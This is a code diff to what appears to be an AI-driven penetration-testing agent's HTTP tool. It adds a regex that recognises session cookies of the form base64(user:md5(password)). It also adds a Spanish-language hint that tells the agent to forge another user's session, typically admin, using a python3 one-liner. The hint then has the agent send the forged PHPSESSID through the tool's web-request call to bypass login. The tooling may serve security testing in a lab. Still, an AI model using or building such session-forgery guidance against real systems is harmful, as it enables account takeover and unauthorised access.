@@ -32,6 +32,7 @@ import os
 import re
 import tempfile
 from pathlib import Path
+from collections.abc import Mapping
 from typing import Any
 from urllib.parse import urlsplit
 
@@ -774,6 +775,54 @@ def _parse_last_json(stdout: str) -> dict[str, Any]:
     raise ValueError("http client did not return a JSON result")
 
 
+#: A session cookie that decodes to ``user:<32 hex>`` is a forgeable handle,
+#: not an opaque id: the app is signing the session with the password hash.
+#: Measured in Hijack (2026-10-30): ``PHPSESSID`` was
+#: ``base64("admin:" + md5(password))``, and the run never noticed, so the
+#: hashes it already had could not be turned into an admin session.
+_SESSION_DECODED_RE = re.compile(
+    r"^(?P<user>[A-Za-z0-9_.@\-]{1,64}):(?P<digest>[0-9a-fA-F]{32})$"
+)
+
+
+def _session_scheme(cookies: Mapping[str, str]) -> dict[str, Any] | None:
+    """The forgeable scheme a response cookie reveals, or ``None``.
+
+    Only whole-value base64 that decodes to ``user:32hex`` is reported: that is
+    the exact shape of a ``base64(user:md5(password))`` session, and naming it
+    turns "compare hashes by hand" into one deterministic command.
+    """
+    from ._loot import decode_base64_text
+
+    for name, value in (cookies or {}).items():
+        decoded = decode_base64_text(value)
+        if not decoded:
+            continue
+        match = _SESSION_DECODED_RE.match(decoded.strip())
+        if match is None:
+            continue
+        return {
+            "cookie": name,
+            "scheme": "base64(user:md5(password))",
+            "decoded": decoded.strip(),
+            "username": match.group("user"),
+            "hash": match.group("digest"),
+            "hash_kind": "md5",
+        }
+    return None
+
+
+FORGEABLE_SESSION_HINT = (
+    "El cookie de sesión es base64('<usuario>:md5(<contraseña>)'), no un id "
+    "aleatorio: si tienes el hash o la contraseña puedes FORJAR la sesión de otro "
+    "usuario sin pasar por el login. Calcula el valor con nexus.shell.exec: "
+    "python3 -c \"import base64,hashlib;print(base64.b64encode(('admin:'+"
+    "hashlib.md5(b'PASSWORD').hexdigest()).encode()).decode())\" y mándalo en "
+    "nexus.web.request(cookie='PHPSESSID=<valor>'). Si el panel deja de responder "
+    "'Access denied' o el formulario de login, la sesión es válida."
+)
+
+
 def _cookie_pairs(set_cookie: Any) -> dict[str, str]:
     """``{name: value}`` from raw ``Set-Cookie`` values (attributes dropped).
 
@@ -1103,6 +1152,10 @@ async def _http_request_handler(arguments: dict[str, Any], context: RunContext) 
     else:
         evidence["error"] = payload.get("error")
 
+    scheme = _session_scheme(response_cookies)
+    if scheme is not None:
+        evidence["session_scheme"] = scheme.get("scheme")
+        evidence["session_scheme_cookie"] = scheme.get("cookie")
     output: dict[str, Any] = {
         "url": url,
         "method": payload.get("method", method),
@@ -1126,6 +1179,8 @@ async def _http_request_handler(arguments: dict[str, Any], context: RunContext) 
         # Markup only: emails, people + roles, same-origin links, technology and
         # the derived identity candidates. Absent on a non-HTML response.
         "extracted": page_evidence,
+        **({"session_scheme": scheme, "session_forge_hint": FORGEABLE_SESSION_HINT}
+           if scheme is not None else {}),
     }
     # The empty-export case is annotated with the request URL (the payload's
     # ``url`` is the one the sandbox echoed back, which is the same string).
